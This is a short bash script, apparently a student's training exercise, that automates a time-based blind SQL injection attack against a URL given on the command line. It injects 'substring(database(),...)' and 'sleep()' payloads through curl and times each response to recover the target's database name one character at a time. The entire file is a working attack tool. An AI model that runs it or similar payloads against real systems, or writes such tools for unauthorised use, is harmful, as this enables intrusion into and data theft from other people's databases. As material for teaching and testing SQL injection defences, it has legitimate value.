#!/bin/bash

url=$1 
#############################3 Calculating loading time ####################
	Start=$(date +'%s')
	curl -s "$url" >/dev/null
	End=$(date +'%s')
	loading=$(($End-$Start)) 
	time=$(($loading+4))
	echo "Laoding time for given website is $time seconds "
	echo "[info] Trying if target is vulnerable to Time-based SQL Injection"
############################  Strating the test ##########################
read -p "[info] Time-Based Injection Test may take some time, would you like to continue? y or n[default yes]"  answer
if [[  $answer == "\n" ]]
then 
	answer='y'
fi
if [[ $answer =~ 'y' ]]
then 

	for x in {1..30};
	do
		for letter in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 . _ \$ @
		do 
			Start=$(date +'%s')
			curl -s "$url+and+if+(substring(database(),`echo $x`,1)+=+'`echo $letter`',sleep(${time}),0)" >/dev/null
			End=$(date +'%s')
			Diff=$(($End-$Start)) 
			if [ "$Diff" -ge  "${time}"  ];
			then
				echo "[info] Sleeping for $time seconds to get letter $x of the database name" 
				value=${value}${letter}
				echo "[***]  letter number $x of the database name is $letter"
				break
			fi
		done
		if [[ $letter == '@' ]]
		then
			break
		fi
	done

	if [[ -n $value ]]
	then
		echo "[***]  This page is vulnerable to Time-Based SQL Injection"
		echo "[***]  Database name is: $value"
	fi
else 
	echo "[info] Quitting"
fi
#### by Maram Essam
### ITI_SA_37
